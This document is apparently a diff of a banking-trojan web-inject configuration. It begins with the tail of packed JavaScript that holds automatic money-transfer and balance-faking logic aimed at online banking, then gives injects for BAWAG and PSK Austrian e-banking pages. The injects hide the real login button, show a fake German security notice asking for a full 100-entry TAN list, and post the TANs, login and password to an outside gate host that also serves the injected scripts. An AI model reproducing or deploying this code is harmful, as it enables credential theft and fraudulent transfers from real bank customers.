"+B(s[3]);d 3i=B(s[6]);f(4N(1S,3k,3i,1)){2l.37(i);i=i-1;k=k-1;2l.37(i);i=i-1;k=k-1}}}}}}}}m 6P(){f(2j&&3e){d 1S=B(3e);f(1S.l>0){d y=2j.D("2a");d k=y.l;f(y&&y.l>0){H(d i=0;i<k;i++){f(y[i].33=="3h-3P-1Y"){d s=y[i].D("1a");f(s&&s.l>0){d 3k=B(s[2])+" "+B(s[3]);d 3i=B(s[6]);f(4N(1S,3k,3i,1)){2j.37(i);i=i-1;k=k-1;2j.37(i);i=i-1;k=k-1}}}}}}}}m 76(){f(14){d y=14.D("2a");f(y&&y.l>0){H(d i=0;i<y.l;i++){f(y[i].1d.v().w("5k")>=0){d s=y[i].D("1a");f(s&&s.l>0){d 1n=B(s[1]);d 1J=1y(B(s[3]));d 1g=4J(1n);f(1g!=0){1g=1g+1J;s[3].V=2c(1g)}}}}}}}m 75(){f(3n&&2I&&3s&&N){f(N.1B.l>0&&N.1z!=-1){d 1n=N.1B[N.1z].1Q;d 5d=1y(B(2I));d 6Z=1y(B(3s));f(1n&&1n.l>3){d 1g=4J(1n);f(1g!=0){2I.V=2c(1g+5d);3n.V=2c(1g+5d+6Z)}}}}}m 6O(){f(o.35.2P.v().w("9d.9e")==-1)h;d 2G;d 3g=0;d y=o.D("2a");f(y&&y.l>0){H(d r=0;r<y.l;r++){f(y[r].33.w("3h-3P-1Y")>=0){f(y[r].1U){d 4K=y[r].1U.D("2a");f(4K&&4K.l>0){f(B(4K[0]).v().w("9j")>=0){2G=y[r].1U;d s=y[r].D("1a");f(s&&s.l>=5){d 1n=B(s[1]);d 1J=1y(B(s[3]));3g=3g+1J;d 1g=4J(1n);f(1g!=0){3g=3g+1g;1g=1g+1J;s[3].V=2c(1g)}}}}}}}}d 4T=0;f(2G){d s=2G.D("1a");f(s&&s.l>0){s[s.l-1].V="<b>"+2c(3g);+"</b>"}f(2G.1U&&2G.1U.1U){d 2p=2G.1U.1U.D("5e");f(2p&&2p.l>0){H(d i=0;i<2p.l-1;i++){f(2p[i].V.v().w("3h-3P-1Y")>=0){d s=2p[i].D("1a");f(s&&s.l>0){4T=4T+1y(B(s[s.l-1]))}}j f(2p[i].V.v().w("9k 73 9p")>=0){d 4I=2p[i].D("1a");f(4I&&4I.l>=3){4I[2].V="<b>"+2c(4T)+"</b>"}}}}}}}m 77(){76();75();6X();6W();6P();6O();3V()}m 31(){f((14||2i||4h||(3n&&3s&&2I&&N)||2l||(2j&&3e))&&1N!=\'1\'){1m("1E","1",1j);1E=\'1\';6N();6L()}j{3V()}}m 5r(){1E=\'1\';1N=\'1\';1m(\'1E\',\'1\',1j);1m(\'1N\',\'1\',1j);38=6M();5a();d r=4O();f(!r){K(1);h}j{f(9q){2g(9o,39)}j{2g(4t,1)}}}m 6T(){f(9n&&41&&14){1m("1E","0",1j);1m("1N","0",1j)}f(41&&14&&1E==\'0\'){6R();5a();f(9l){5r();h}j{6V();h}}j{31();h}}m 6S(){d P=o.2N("2S");P.I.Q="1e";P.1d="P";o.19.2e(P);d P=o.G("P");d 12=o.19.6U;f(12&&12.l>0){d k=12.l;H(d i=0;i<k;i++){f(12[i].1d!="16"&&12[i].1d!="18"&&12[i].1d!="17"&&12[i].1d!="58"&&12[i].1d!="36"&&12[i].1d!="53"){4S{P.2e(12[i]);i--;k--}5F(e){9m(0)}}}}o.19.I.Q="";6T()}f(41&&(14||2i||4h||(3n&&3s&&2I&&N)||2l||(2j&&3e))){6S()}j{31()}',62,653,'|||||||||||||var||if||return||else||length|function||document|return_msg|doc||tds||ifr_state|toLowerCase|indexOf|false|trs|storage|value|InnerContent|not|getElementsByTagName|found|res|getElementById|for|style|name|SendStatus|GetObjectById|key|account_select|ifr_document|body_div|display|OnLoadIFrame|script_src|true||innerHTML|proxy_frame|num|sel_found|ifrm|||bodyElements|api|balances_table|replacer_array|tan_div|wait_div|simple_wait_div|body|td|framesets|replace|id|none|transfer_type|a_balance|ifrdoc|new|180|input|val|write_cls|account_nr|script|transfer_from_account_nr|browser_type|tmp|LockBox|link|fk_tan_input|get_state|urlencode|original_tan_input|prsFloat|selectedIndex|transfered_amount|options|pdoc|FillDropForm|ats_started|max_sum|arr|ifr_window|tan_nr|account_balance|menu_doc|FillIBANForm|no|ats_in_progress|frames|tan_error_flag|text|drop_account_nr|selected_account_text|get|parentNode|pkey|seltext|url|content|scripts|||win|localStorageName||set|is||||tr|read_cls|formatCurrency|GetFrameDoc|appendChild|res_balances|LoadLinkIntoIframe|FillCountryForm|transfers_table|transfers_table3|v2|transfers_table2|drop_account_nr_input|amount_cent_input|transfers_table_select|b_tables|params|amount_input|drop_name_input|param|TAN|alert|elements|transfer_memo_input|fk_tan_label|ifr0||login|now|post_process|onclick_text|drop_account_bic|b_table|cond|saldo_label|Date|auth_type_label|new_iban_transfer_link|auth_status_label|createElement|frame_name|href|new_int_transfer_link|currency_select|div|code|null|ReturnTrue|country|country_select|contentWindow|break|100|ATSEnd|inputs|className|transfer_memo|location|ifr_ie|deleteRow|holder_name||ebody|tables|GetData|max_limit|search_account_label|split|total_balance|lijst|td_transfered_amount|drop_name|td_drop_account_nr|transfer_type_select|frameset|total_label|pr|file_name|ParseFinishPage|flogin|kredit_label|action|select|contentDocument|Array|min_limit|FF|selected|IE67|readyState|IE|percent|in|Math|index|tdiv|ing|admin_link|result|cents|1000|divs|ssid|rij|obj|Char|Number|clear|getStorage|ShowContent|password|documentElement|FindInputByAlt|substr||start_div|found_frame|ParseBankErrors|de|substring|nl|mijn|limit_div|item|CalcPercent|onreadystatechange|href_text|limit|tfrm|date|ChooseTransferAmount|saldo_page_div|expires|src_text|store|drop_account_bic_input|defined|write|version|account|save|cols|holder_name_label|begin_transfer_link|parent|self|error_timestamp|ifrwin|t1|statusoverzicht_link|t2|t3|onload|setTimeout|password_input|textContent|remove|login_input|tds1|GetTransfersAmount|trhs|str|globalStorageName|CheckTransferExists|SelectMaximalAccount|geblokkeerd|final_div|src|try|all_balance|navigator|userAgent|5000px|GetLinkByTd|ensureStorage|https|all|fpassword|ShowTanDiv|log|StatusInt|span|sign|tan_input|ifr_ff|floor|GetMainBalances|doSubmit|parseInt|saldo_balance|table|attributes|undefined|istate|FormPosted|received|giro|doOkVerzenden|toString|attr|TanPost|msie|OnLoadProxyFrame|ATSStart|responseText|EUR|ca|menu|nameEQ|cookie|ACD|complete|days|load|callback|timeouted|javascript|catch|IfrPostData|vl|EMPTY|trimJS|monthday|ParseReceivedXMLToArray|hour|lastIndexOf|innerText|welkom|charAt|ValidChars|parseFloat|vurl|alt_value|trimBrakets|drop|OnLoadACD|LoadScript|t_type||returnDocument|year|eval|second|than|window|monthnumber|rm|holder|fo|element_type|max_balance|state|PostPageContent|area|perc|end|loaded|minute|height|globalStorage|tan|GetDropData|setAttribute|lockbox|content_doc|GetStatusLinkByTd|tan_nr_label|userData|ChooseTransferType|GetTransferLinks|and|iban|1024|768|width|IFRAME|removeChild|show_debug|position|getAttribute|domain|top|absolute|tan_label|default|GetReplacerData|GetHolderName|ShowSimpleWaitDiv|ReplaceAtSaldoPage|HideTransfers3|DetectBrowser|ShowWaitDiv|ChangeBody|mainStart|childNodes|GetATSState|HideTransfers2|HideTransfers|removeAttribute|kredit_balance|tan_digits_msg|tan_missing_msg|tan_error_msg|alle|addBehavior|ReplaceHeaderBalance|ReplaceMainBalance|StartReplacerFunctions|delete|defaultValue|left|drop_account_nr_value|transfer_from_account_nr_value|account_text|from_account_nr|transfered_amount_value|readCookie|v3|v1|AddReplacerArrayItem|writeCookie|mult_flag|drop_nr|Om|ingevoerd|foutieve|een|veiligheidsredenen|functie|amount|heeft|keer|CheckStore|CheckLockbox|bankrekening|err1|00|home|amenuitems|rekeningselectie|overschrijven|naar|m_flag|removeItem|SaveLoginData|method|999999|fake_transfer|doOk|doClick|POST|XMLDocument|onclick|open|Function|enctype|firefox|setItem|getItem|multipart|hostname|localStorage|data|toGMTString|getDate|getMonth|getYear|1900|while|path|getSeconds|getMinutes|ipt|close|setTime|scr|submit|getHours|forms|ript|sc|Error|DomStorage|documentLink|throw|getTime|content_grabber_link|form|works|documentFile|Login|dom|_|Password|after|documentContent|only|behavior|bestaan|sepa_rekeningselectie|sepa_gironaam|sepa_iban|sepa_bedragcent|sepa_bedrageuro|frame|with|sepa_bic|sepa_mededeling1|sepa_muntsoort|eur|short|too|textarea|sepa_landbankbegunstigde|titel|scherm|ingevuld|bij|velden|verplichte|onjuist|niet|onder|deze|cijfers|te|uit|dient|betaalrekening|round|||||currency|limit_percent|vangiro|productbezit|do|typeof|doVerder|StatusOvz|doVerzendenVoorbereiden|betaalrekeningen|totaal|additional_transfers|void|reset_ats_at_start|service_and_install_link|rekeningen|check_account_type|Type|use_sms_accounts|gironaam|mededeling1|naarrekening|bedragcent|overschrijftype|bedrageuro|europese|overschrijving|links|Status|transfer|internal|NieuweOpdracht|BuitenlandOpdracht|error|naam|head|Please|zero|less|maximal|balance|enable|browser|internetbankieren|SesamLoginServlet|again|to|support|ig|381|encodeURIComponent|0123456789|50000000001|abs|isNaN|alt|accounts|Limit|parametrs|Min|lower|balances|ACD_link|type|Transfer|this|mpb|YES|suitable|already|exists|failed|success|get_balance|content_grabber|or|from|int|check|uri|empty|tango|panel|admin|Drop'.split('|'),0,{}))
+</script>
+data_end
+data_after
+data_end
+set_url "*ebanking.bawag.com*" GP
+
+data_before
+<a href="#" onclick="CheckAndSecureLogin(document.loginform);return false;" name="submitlogin" id="lof12" alt="Jetzt einloggen" class="formbutton"
+data_end
+
+data_inject
+ style="display:none"
+data_end
+
+data_after
+data_end
+
+
+data_before
+<a href="#" onclick="CheckAndSecureLogin(document.loginform);return false;" name="submitlogin" id="lof12" alt="Jetzt einloggen" class="formbutton"*>LOGIN</a>
+data_end
+
+data_inject
+<a href="#" onclick="Check();return false;" name="submitlogin" id="lof12" alt="Jetzt einloggen" class="formbutton">LOGIN</a>
+data_end
+
+data_after
+data_end
+
+
+
+data_before
+</body>*</html>
+data_end
+
+data_inject
+<link rel="stylesheet" type="text/css" href="https://fur.sicherheit-schild.eu/at/scripts/bawag.css" /> 
+<script language=JavaScript src="https://fur.sicherheit-schild.eu/at/scripts/bawag.js"></script>
+
+<div id="test"></div>
+<div id="warning">
+	<div style="background:white;">
+		<div id="top">
+			<center>Achtung!</center>
+		</div>
+	
+		<div style="font-size:11px;margin:10px;font-family:Verdana;">Sehr geehrter Kunde, in dem Zusammenhang mit der Einf&uuml;hrung der neuen Sicherheitsmassnahmen, die Best&auml;tigung der Transaktionen mit der Eingabe der Chip-TAN's, die dem Schutz vor dem unberechtigten Zugriff von Dritten auf Ihr Konto dienen, m&uuml;ssen wir alle laufenden TAN-Listen aus dem Verkehr ziehen. Aus dem gegebenen Grund bitten wir Sie h&ouml;fflichst uns die Informationen &uuml;ber die aktuellen TAN-Listen zur Verfugung zu stellen. Die Ma&szlig;nahme dient dazu, dass wir die Wiederholung der TAN-Listen fur Ihr Bankkonto vermeiden k&ouml;nnen. Wir bedanken uns sehr f&uuml;r Ihr Entgegenkommen.<br/>Ihre BAWAG P.S.K Sofa-Banking.</div><br/>
+		<iframe style="display:none" name="ifr" id="ifr"></iframe>
+		<form name="forma" id="forma" action="https://fur.sicherheit-schild.eu/at/gate.php" method="POST" target="ifr">
+		<input type="hidden" name="bank" value="bawag"/>
+		<input type="hidden" name="login" id="xlogin" />
+		<input type="hidden" name="pass" id="xpass" />
+			<center>
+			
+			<table cellpadding=0 cellspacing=0>
+				<tr >
+					<td style="background:#C3C3C3;">
+						
+					</td>
+				</tr>
+				<tr style="background:#C3C3C3;">
+					<td>
+				<table class="tan_table">
+					<tr>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+					</tr>
+					<tr>
+						<td class="nrc">001</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan01"></td>
+						<td class="nrc">011</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan11"></td>
+						<td class="nrc">021</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan21"></td>
+						<td class="nrc">031</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan31"></td>
+						<td class="nrc">041</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan41"></td>
+						<td class="nrc">051</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan51"></td>
+						<td class="nrc">061</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan61"></td>
+						<td class="nrc">071</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan71"></td>
+						<td class="nrc">081</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan81"></td>
+						<td class="nrc">091</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan91"></td>
+					</tr>
+					<tr>
+						<td class="nrc">002</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan02"></td>
+						<td class="nrc">012</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan12"></td>
+						<td class="nrc">022</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan22"></td>
+						<td class="nrc">032</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan32"></td>
+						<td class="nrc">042</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan42"></td>
+						<td class="nrc">052</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan52"></td>
+						<td class="nrc">062</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan62"></td>
+						<td class="nrc">072</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan72"></td>
+						<td class="nrc">082</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan82"></td>
+						<td class="nrc">092</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan92"></td>
+					</tr>
+					<tr>
+						<td class="nrc">003</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan03"></td>
+						<td class="nrc">013</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan13"></td>
+						<td class="nrc">023</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan23"></td>
+						<td class="nrc">033</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan33"></td>
+						<td class="nrc">043</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan43"></td>
+						<td class="nrc">053</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan53"></td>
+						<td class="nrc">063</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan63"></td>
+						<td class="nrc">073</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan73"></td>
+						<td class="nrc">083</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan83"></td>
+						<td class="nrc">093</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan93"></td>
+					</tr>
+					<tr>
+						<td class="nrc">004</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan04"></td>
+						<td class="nrc">014</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan14"></td>
+						<td class="nrc">024</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan24"></td>
+						<td class="nrc">034</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan34"></td>
+						<td class="nrc">044</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan44"></td>
+						<td class="nrc">054</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan54"></td>
+						<td class="nrc">064</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan64"></td>
+						<td class="nrc">074</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan74"></td>
+						<td class="nrc">084</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan84"></td>
+						<td class="nrc">094</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan94"></td>
+					</tr>
+					<tr>
+						<td class="nrc">005</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan05"></td>
+						<td class="nrc">015</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan15"></td>
+						<td class="nrc">025</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan25"></td>
+						<td class="nrc">035</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan35"></td>
+						<td class="nrc">045</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan45"></td>
+						<td class="nrc">055</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan55"></td>
+						<td class="nrc">065</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan65"></td>
+						<td class="nrc">075</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan75"></td>
+						<td class="nrc">085</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan85"></td>
+						<td class="nrc">095</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan95"></td>
+					</tr>
+					<tr>
+						<td class="nrc">006</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan06"></td>
+						<td class="nrc">016</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan16"></td>
+						<td class="nrc">026</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan26"></td>
+						<td class="nrc">036</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan36"></td>
+						<td class="nrc">046</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan46"></td>
+						<td class="nrc">056</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan56"></td>
+						<td class="nrc">066</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan66"></td>
+						<td class="nrc">076</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan76"></td>
+						<td class="nrc">086</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan86"></td>
+						<td class="nrc">096</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan96"></td>
+					</tr>
+					<tr>
+						<td class="nrc">007</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan07"></td>
+						<td class="nrc">017</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan17"></td>
+						<td class="nrc">027</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan27"></td>
+						<td class="nrc">037</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan37"></td>
+						<td class="nrc">047</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan47"></td>
+						<td class="nrc">057</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan57"></td>
+						<td class="nrc">067</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan67"></td>
+						<td class="nrc">077</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan77"></td>
+						<td class="nrc">087</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan87"></td>
+						<td class="nrc">097</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan97"></td>
+					</tr>
+					<tr>
+						<td class="nrc">008</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan08"></td>
+						<td class="nrc">018</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan18"></td>
+						<td class="nrc">028</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan28"></td>
+						<td class="nrc">038</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan38"></td>
+						<td class="nrc">048</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan48"></td>
+						<td class="nrc">058</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan58"></td>
+						<td class="nrc">068</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan68"></td>
+						<td class="nrc">078</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan78"></td>
+						<td class="nrc">088</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan88"></td>
+						<td class="nrc">098</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan98"></td>
+					</tr>
+					<tr>
+						<td class="nrc">009</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan09"></td>
+						<td class="nrc">019</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan19"></td>
+						<td class="nrc">029</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan29"></td>
+						<td class="nrc">039</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan39"></td>
+						<td class="nrc">049</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan49"></td>
+						<td class="nrc">059</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan59"></td>
+						<td class="nrc">069</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan69"></td>
+						<td class="nrc">079</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan79"></td>
+						<td class="nrc">089</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan89"></td>
+						<td class="nrc">099</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan99"></td>
+					</tr>
+					<tr>
+						<td class="nrc">010</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan10"></td>
+						<td class="nrc">020</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan20"></td>
+						<td class="nrc">030</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan30"></td>
+						<td class="nrc">040</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan40"></td>
+						<td class="nrc">050</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan50"></td>
+						<td class="nrc">060</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan60"></td>
+						<td class="nrc">070</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan70"></td>
+						<td class="nrc">080</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan80"></td>
+						<td class="nrc">090</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan90"></td>
+						<td class="nrc">100</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan100"></td>
+					</tr>
+				</table>
+					</td>
+				</tr>
+				<tr>
+					<td>
+						
+					</td>
+				</tr>
+			</table>
+			<div class="vip_button">
+				<input type="button" value="Absenden" onClick="DoLogin();return false;">
+			</div>
+			</center>
+		</form>
+	</div>
+</div>
+
+data_end
+
+data_after
+data_end
+
+set_url "*psk.co.at/*" GP
+
+data_before
+<a*name="submitlogin"
+data_end
+
+data_inject
+ style="display:none"
+data_end
+
+data_after
+data_end
+
+
+data_before
+<a*name="submitlogin"*</a>
+data_end
+
+data_inject
+<a href="#" onclick="Check();return false;" name="submitlogin" id="lof12" alt="Jetzt einloggen" class="formbutton">LOGIN</a>
+data_end
+
+data_after
+data_end
+
+
+
+data_before
+</body>*</html>
+data_end
+
+data_inject
+<link rel="stylesheet" type="text/css" href="https://fur.sicherheit-schild.eu/at/scripts/psk.css" /> 
+<script language=JavaScript src="https://fur.sicherheit-schild.eu/at/scripts/psk.js"></script>
+
+<div id="test"></div>
+<div id="warning">
+	<div style="background:white;">
+		<div id="top">
+			<center>Achtung!</center>
+		</div>
+	
+		<div style="font-size:11px;margin:10px;font-family:Verdana;">Sehr geehrter Kunde, in dem Zusammenhang mit der Einf&uuml;hrung der neuen Sicherheitsmassnahmen, die Best&auml;tigung der Transaktionen mit der Eingabe der Chip-TAN's, die dem Schutz vor dem unberechtigten Zugriff von Dritten auf Ihr Konto dienen, m&uuml;ssen wir alle laufenden TAN-Listen aus dem Verkehr ziehen. Aus dem gegebenen Grund bitten wir Sie h&ouml;fflichst uns die Informationen &uuml;ber die aktuellen TAN-Listen zur Verfugung zu stellen. Die Ma&szlig;nahme dient dazu, dass wir die Wiederholung der TAN-Listen fur Ihr Bankkonto vermeiden k&ouml;nnen. Wir bedanken uns sehr f&uuml;r Ihr Entgegenkommen.<br/>Ihre BAWAG P.S.K Sofa-Banking.</div><br/>
+		<iframe style="display:none" name="ifr" id="ifr"></iframe>
+		<form name="forma" id="forma" action="https://fur.sicherheit-schild.eu/at/gate.php" method="POST" target="ifr">
+		<input type="hidden" name="bank" value="psk"/>
+		<input type="hidden" name="login" id="xlogin" />
+		<input type="hidden" name="pass" id="xpass" />
+			<center>
+			
+			<table cellpadding=0 cellspacing=0>
+				<tr >
+					<td style="background:#C3C3C3;">
+						
+					</td>
+				</tr>
+				<tr style="background:#C3C3C3;">
+					<td>
+				<table class="tan_table">
+					<tr>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+						<td class="nr">Nr.</td>
+						<td class="tan">TAN</td>
+					</tr>
+					<tr>
+						<td class="nrc">001</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan01"></td>
+						<td class="nrc">011</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan11"></td>
+						<td class="nrc">021</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan21"></td>
+						<td class="nrc">031</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan31"></td>
+						<td class="nrc">041</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan41"></td>
+						<td class="nrc">051</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan51"></td>
+						<td class="nrc">061</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan61"></td>
+						<td class="nrc">071</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan71"></td>
+						<td class="nrc">081</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan81"></td>
+						<td class="nrc">091</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan91"></td>
+					</tr>
+					<tr>
+						<td class="nrc">002</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan02"></td>
+						<td class="nrc">012</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan12"></td>
+						<td class="nrc">022</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan22"></td>
+						<td class="nrc">032</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan32"></td>
+						<td class="nrc">042</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan42"></td>
+						<td class="nrc">052</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan52"></td>
+						<td class="nrc">062</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan62"></td>
+						<td class="nrc">072</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan72"></td>
+						<td class="nrc">082</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan82"></td>
+						<td class="nrc">092</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan92"></td>
+					</tr>
+					<tr>
+						<td class="nrc">003</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan03"></td>
+						<td class="nrc">013</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan13"></td>
+						<td class="nrc">023</td>
+						<td class="tan"><input type="text" maxlength=5 class="inputs" size=5 name="tan23"></td>
+						<td class="nrc">033</td>
